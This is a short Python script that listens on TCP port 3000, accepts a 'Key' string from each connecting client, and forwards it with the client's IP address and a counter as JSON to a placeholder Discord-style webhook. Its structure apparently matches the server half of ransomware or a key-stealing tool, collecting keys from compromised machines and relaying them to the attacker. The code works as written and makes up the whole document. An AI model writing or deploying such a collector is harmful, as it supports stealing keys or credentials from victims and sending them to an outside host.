import socket
import requests
import json
key_id = 1
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Host = '0.0.0.0'
Port = 3000
sock.bind((Host,Port))
print(f"Listening at {sock.getsockname()}")
sock.listen(1)
while True:
      data, clientAddress = sock.accept()
      Key = data.recv(1024).decode('utf-8')
      dic = {
        'key_id': key_id,
        'Key': Key,
        'IP': clientAddress
        }
      json_object = json.dumps(dic,indent=4)
      url = "webhook url like discord"
      message = requests.post(url,json_object)
      key_id +=1



    





    











    
   
        











    




  


   


